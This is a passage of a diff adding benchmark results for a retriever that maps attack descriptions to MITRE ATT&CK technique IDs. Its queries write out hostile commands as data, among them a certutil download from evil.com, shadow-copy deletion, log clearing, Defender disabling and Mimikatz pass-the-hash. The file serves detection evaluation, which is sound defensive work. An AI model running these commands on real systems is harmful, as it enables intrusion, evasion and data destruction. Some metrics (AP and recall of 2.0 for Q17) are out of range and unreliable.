+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 25.62
+        },
+        {
+          "query_id": "Q11",
+          "category": "Initial Access",
+          "query": "Spearphishing email delivered with malicious invoice.xlsm containing VBA macro payload",
+          "ground_truth": [
+            "T1566.001"
+          ],
+          "top_hit_id": "T1566.001",
+          "top_hit_name": "Spearphishing Attachment",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 24.31
+        },
+        {
+          "query_id": "Q12",
+          "category": "Execution",
+          "query": "Execution of remote process via WMI wmic process call create cmd.exe /c whoami",
+          "ground_truth": [
+            "T1047"
+          ],
+          "top_hit_id": "T1047",
+          "top_hit_name": "Windows Management Instrumentation",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 25.69
+        },
+        {
+          "query_id": "Q13",
+          "category": "Defense Evasion",
+          "query": "Adversary copied payload to C:\\Windows\\System32\\svchost.exe pretending to be legitimate system file",
+          "ground_truth": [
+            "T1036.005"
+          ],
+          "top_hit_id": "T1140",
+          "top_hit_name": "Deobfuscate/Decode Files or Information",
+          "ap": 0.0,
+          "rr": 0.0,
+          "ndcg10": 0.0,
+          "p5": 0.0,
+          "p10": 0.0,
+          "r10": 0.0,
+          "latency_ms": 26.22
+        },
+        {
+          "query_id": "Q14",
+          "category": "Defense Evasion",
+          "query": "Disabling Windows Defender antivirus real-time monitoring via Set-MpPreference -DisableRealtimeMonitoring $true",
+          "ground_truth": [
+            "T1562.001"
+          ],
+          "top_hit_id": "T1685.003",
+          "top_hit_name": "Modify or Spoof Tool UI",
+          "ap": 0.5,
+          "rr": 0.5,
+          "ndcg10": 0.6309,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 24.59
+        },
+        {
+          "query_id": "Q15",
+          "category": "Discovery",
+          "query": "Enumeration of Active Directory domain users and group memberships using net user /domain and net group",
+          "ground_truth": [
+            "T1087.002"
+          ],
+          "top_hit_id": "T1087.002",
+          "top_hit_name": "Domain Account",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 24.7
+        },
+        {
+          "query_id": "Q16",
+          "category": "Lateral Movement",
+          "query": "Lateral movement using Pass the Hash authentication via Mimikatz sekurlsa::pth with NTLM hash",
+          "ground_truth": [
+            "T1550.002"
+          ],
+          "top_hit_id": "T1550.002",
+          "top_hit_name": "Pass the Hash",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 26.34
+        },
+        {
+          "query_id": "Q17",
+          "category": "Privilege Escalation / Defense Evasion",
+          "query": "DLL side-loading via vulnerable application loading malicious version.dll from local application directory",
+          "ground_truth": [
+            "T1574.002"
+          ],
+          "top_hit_id": "T1574.001",
+          "top_hit_name": "DLL",
+          "ap": 2.0,
+          "rr": 1.0,
+          "ndcg10": 1.6309,
+          "p5": 0.4,
+          "p10": 0.2,
+          "r10": 2.0,
+          "latency_ms": 29.83
+        },
+        {
+          "query_id": "Q18",
+          "category": "Command and Control",
+          "query": "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe ingress download",
+          "ground_truth": [
+            "T1105"
+          ],
+          "top_hit_id": "T1105",
+          "top_hit_name": "Ingress Tool Transfer",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 27.14
+        },
+        {
+          "query_id": "Q19",
+          "category": "Defense Evasion",
+          "query": "Modifying file access control permissions with icacls /grant Everyone:F to access sensitive directory",
+          "ground_truth": [
+            "T1222.001"
+          ],
+          "top_hit_id": "T1222.001",
+          "top_hit_name": "Windows Permissions",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 26.08
+        },
+        {
+          "query_id": "Q20",
+          "category": "Credential Access",
+          "query": "Network packet sniffing on interface using Wireshark or promiscuous mode to capture cleartext credentials",
+          "ground_truth": [
+            "T1040"
+          ],
+          "top_hit_id": "T1040",
+          "top_hit_name": "Network Sniffing",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 27.25
+        },
+        {
+          "query_id": "Q21",
+          "category": "Defense Evasion",
+          "query": "Clearing Windows security event logs via wevtutil cl Security to cover tracks after intrusion",
+          "ground_truth": [
+            "T1070.001"
+          ],
+          "top_hit_id": "T1685.005",
+          "top_hit_name": "Clear Windows Event Logs",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 28.42
+        },
+        {
+          "query_id": "Q22",
+          "category": "Persistence / Defense Evasion",
+          "query": "Background Intelligent Transfer Service job created via bitsadmin /transfer to stage malware",
+          "ground_truth": [
+            "T1197"
+          ],
+          "top_hit_id": "T1197",
+          "top_hit_name": "BITS Jobs",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 22.84
+        },
+        {
+          "query_id": "Q23",
+          "category": "Defense Evasion",
+          "query": "Proxy execution of unauthorized code via msbuild.exe executing inline C# project file",
+          "ground_truth": [
+            "T1127.001"
+          ],
+          "top_hit_id": "T1127.001",
+          "top_hit_name": "MSBuild",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 27.31
+        },
+        {
+          "query_id": "Q24",
+          "category": "Collection",
+          "query": "Adversary archived stolen documents into password protected 7z archive using 7z.exe a -p",
+          "ground_truth": [
+            "T1560.001"
+          ],
+          "top_hit_id": "T1027.015",
+          "top_hit_name": "Compression",
+          "ap": 0.3333,
+          "rr": 0.3333,
+          "ndcg10": 0.5,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 24.8
+        },
+        {
+          "query_id": "Q25",
+          "category": "Persistence",
+          "query": "Creation of malicious Windows service for persistent execution using sc create MalService binPath= payload.exe",
+          "ground_truth": [
+            "T1543.003"
+          ],
+          "top_hit_id": "T1543.003",
+          "top_hit_name": "Windows Service",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 26.74
+        }
+      ]
+    },
+    "hybrid_prf": {
+      "mode": "hybrid_prf",
+      "queries_evaluated": 25,
+      "metrics": {
+        "MAP": 0.8467,
+        "MRR": 0.8067,
+        "NDCG@10": 0.8702,
+        "P@1": 0.72,
+        "P@3": 0.3067,
+        "P@5": 0.2,
+        "P@10": 0.1,
+        "Recall@10": 1.0,
+        "Mean_Latency_ms": 38.7
+      },
+      "query_details": [
+        {
+          "query_id": "Q01",
+          "category": "Execution",
+          "query": "powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand aW1wb3J0 invoking script",
+          "ground_truth": [
+            "T1059.001"
+          ],
+          "top_hit_id": "T1546.013",
+          "top_hit_name": "PowerShell Profile",
+          "ap": 0.5,
+          "rr": 0.5,
+          "ndcg10": 0.6309,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 36.29
+        },
+        {
+          "query_id": "Q02",
+          "category": "Credential Access",
+          "query": "Attacker dumped credentials from memory of lsass.exe process using procdump tool",
+          "ground_truth": [
+            "T1003.001"
+          ],
+          "top_hit_id": "T1003.001",
+          "top_hit_name": "LSASS Memory",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 39.29
+        },
+        {
+          "query_id": "Q03",
+          "category": "Defense Evasion / Privilege Escalation",
+          "query": "Adversary injected malicious DLL into svchost.exe memory space via CreateRemoteThread",
+          "ground_truth": [
+            "T1055.001"
+          ],
+          "top_hit_id": "T1055.001",
+          "top_hit_name": "Dynamic-link Library Injection",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 36.15
+        },
+        {
+          "query_id": "Q04",
+          "category": "Persistence",
+          "query": "Scheduled task created via schtasks /create /tn SecurityUpdater /tr updater.bat /sc onlogon",
+          "ground_truth": [
+            "T1053.005"
+          ],
+          "top_hit_id": "T1053.005",
+          "top_hit_name": "Scheduled Task",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 43.61
+        },
+        {
+          "query_id": "Q05",
+          "category": "Persistence",
+          "query": "Registry persistence added at HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "ground_truth": [
+            "T1547.001"
+          ],
+          "top_hit_id": "T1547.001",
+          "top_hit_name": "Registry Run Keys / Startup Folder",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 37.82
+        },
+        {
+          "query_id": "Q06",
+          "category": "Lateral Movement",
+          "query": "RDP connection established from internal host to domain controller on port 3389",
+          "ground_truth": [
+            "T1021.001"
+          ],
+          "top_hit_id": "T1686",
+          "top_hit_name": "Disable or Modify System Firewall",
+          "ap": 0.25,
+          "rr": 0.25,
+          "ndcg10": 0.4307,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 30.29
+        },
+        {
+          "query_id": "Q07",
+          "category": "Command and Control",
+          "query": "Malware communicating with C2 server over HTTPS using periodic HTTP beaconing POST requests",
+          "ground_truth": [
+            "T1071.001"
+          ],
+          "top_hit_id": "T1102.001",
+          "top_hit_name": "Dead Drop Resolver",
+          "ap": 0.3333,
+          "rr": 0.3333,
+          "ndcg10": 0.5,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 34.35
+        },
+        {
+          "query_id": "Q08",
+          "category": "Impact",
+          "query": "vssadmin.exe delete shadows /all /quiet executed before ransomware encryption",
+          "ground_truth": [
+            "T1490"
+          ],
+          "top_hit_id": "T1679",
+          "top_hit_name": "Selective Exclusion",
+          "ap": 0.25,
+          "rr": 0.25,
+          "ndcg10": 0.4307,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 35.68
+        },
+        {
+          "query_id": "Q09",
+          "category": "Credential Access",
+          "query": "Requesting Kerberos Service Principal Name ticket with RC4 encryption to crack offline hash",
+          "ground_truth": [
+            "T1558.003"
+          ],
+          "top_hit_id": "T1558.003",
+          "top_hit_name": "Kerberoasting",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 37.74
+        },
+        {
+          "query_id": "Q10",
+          "category": "Exfiltration",
+          "query": "Data exfiltration using rclone to upload sensitive archives to mega.nz cloud storage",
+          "ground_truth": [
+            "T1567.002"
+          ],
+          "top_hit_id": "T1567.002",
+          "top_hit_name": "Exfiltration to Cloud Storage",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 34.54
+        },
+        {
+          "query_id": "Q11",
+          "category": "Initial Access",
+          "query": "Spearphishing email delivered with malicious invoice.xlsm containing VBA macro payload",
+          "ground_truth": [
+            "T1566.001"
+          ],
+          "top_hit_id": "T1566.001",
+          "top_hit_name": "Spearphishing Attachment",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 38.28
+        },
+        {
+          "query_id": "Q12",
+          "category": "Execution",
+          "query": "Execution of remote process via WMI wmic process call create cmd.exe /c whoami",
+          "ground_truth": [
+            "T1047"
+          ],
+          "top_hit_id": "T1047",
+          "top_hit_name": "Windows Management Instrumentation",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 38.11
+        },
+        {
+          "query_id": "Q13",
+          "category": "Defense Evasion",
+          "query": "Adversary copied payload to C:\\Windows\\System32\\svchost.exe pretending to be legitimate system file",
+          "ground_truth": [
+            "T1036.005"
+          ],
+          "top_hit_id": "T1574.013",
+          "top_hit_name": "KernelCallbackTable",
+          "ap": 0.0,
+          "rr": 0.0,
+          "ndcg10": 0.0,
+          "p5": 0.0,
+          "p10": 0.0,
+          "r10": 0.0,
+          "latency_ms": 37.31
+        },
+        {
+          "query_id": "Q14",
+          "category": "Defense Evasion",
+          "query": "Disabling Windows Defender antivirus real-time monitoring via Set-MpPreference -DisableRealtimeMonitoring $true",
+          "ground_truth": [
+            "T1562.001"
+          ],
+          "top_hit_id": "T1685.003",
+          "top_hit_name": "Modify or Spoof Tool UI",
+          "ap": 0.5,
+          "rr": 0.5,
+          "ndcg10": 0.6309,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 46.16
+        },
+        {
+          "query_id": "Q15",
+          "category": "Discovery",
+          "query": "Enumeration of Active Directory domain users and group memberships using net user /domain and net group",
+          "ground_truth": [
+            "T1087.002"
+          ],
+          "top_hit_id": "T1087.002",
+          "top_hit_name": "Domain Account",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 44.96
+        },
+        {
+          "query_id": "Q16",
+          "category": "Lateral Movement",
+          "query": "Lateral movement using Pass the Hash authentication via Mimikatz sekurlsa::pth with NTLM hash",
+          "ground_truth": [
+            "T1550.002"
+          ],
+          "top_hit_id": "T1550.002",
+          "top_hit_name": "Pass the Hash",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 38.93
+        },
+        {
+          "query_id": "Q17",
+          "category": "Privilege Escalation / Defense Evasion",
+          "query": "DLL side-loading via vulnerable application loading malicious version.dll from local application directory",
+          "ground_truth": [
+            "T1574.002"
+          ],
+          "top_hit_id": "T1574.001",
+          "top_hit_name": "DLL",
+          "ap": 2.0,
+          "rr": 1.0,
+          "ndcg10": 1.6309,
+          "p5": 0.4,
+          "p10": 0.2,
+          "r10": 2.0,
+          "latency_ms": 39.59
+        },
+        {
+          "query_id": "Q18",
+          "category": "Command and Control",
+          "query": "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe ingress download",
+          "ground_truth": [
+            "T1105"
+          ],
+          "top_hit_id": "T1105",
+          "top_hit_name": "Ingress Tool Transfer",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 40.62
+        },
+        {
+          "query_id": "Q19",
+          "category": "Defense Evasion",
+          "query": "Modifying file access control permissions with icacls /grant Everyone:F to access sensitive directory",
+          "ground_truth": [
+            "T1222.001"
+          ],
+          "top_hit_id": "T1222.001",
+          "top_hit_name": "Windows Permissions",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 41.47
+        },
+        {
+          "query_id": "Q20",
+          "category": "Credential Access",
+          "query": "Network packet sniffing on interface using Wireshark or promiscuous mode to capture cleartext credentials",
+          "ground_truth": [
+            "T1040"
+          ],
+          "top_hit_id": "T1040",
+          "top_hit_name": "Network Sniffing",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 37.43
+        },
+        {
+          "query_id": "Q21",
+          "category": "Defense Evasion",
+          "query": "Clearing Windows security event logs via wevtutil cl Security to cover tracks after intrusion",
+          "ground_truth": [
+            "T1070.001"
+          ],
+          "top_hit_id": "T1685.005",
+          "top_hit_name": "Clear Windows Event Logs",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 39.83
+        },
+        {
+          "query_id": "Q22",
+          "category": "Persistence / Defense Evasion",
+          "query": "Background Intelligent Transfer Service job created via bitsadmin /transfer to stage malware",
+          "ground_truth": [
+            "T1197"
+          ],
+          "top_hit_id": "T1197",
+          "top_hit_name": "BITS Jobs",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 40.12
+        },
+        {
+          "query_id": "Q23",
+          "category": "Defense Evasion",
+          "query": "Proxy execution of unauthorized code via msbuild.exe executing inline C# project file",
+          "ground_truth": [
+            "T1127.001"
+          ],
+          "top_hit_id": "T1127.001",
+          "top_hit_name": "MSBuild",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 37.4
+        },
+        {
+          "query_id": "Q24",
+          "category": "Collection",
+          "query": "Adversary archived stolen documents into password protected 7z archive using 7z.exe a -p",
+          "ground_truth": [
+            "T1560.001"
+          ],
+          "top_hit_id": "T1027.015",
+          "top_hit_name": "Compression",
+          "ap": 0.3333,
+          "rr": 0.3333,
+          "ndcg10": 0.5,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 35.85
+        },
+        {
+          "query_id": "Q25",
+          "category": "Persistence",
+          "query": "Creation of malicious Windows service for persistent execution using sc create MalService binPath= payload.exe",
+          "ground_truth": [
+            "T1543.003"
+          ],
+          "top_hit_id": "T1543.003",
+          "top_hit_name": "Windows Service",
+          "ap": 1.0,
+          "rr": 1.0,
+          "ndcg10": 1.0,
+          "p5": 0.2,
+          "p10": 0.1,
+          "r10": 1.0,
+          "latency_ms": 45.64
+        }
+      ]
+    }
+  }
+}
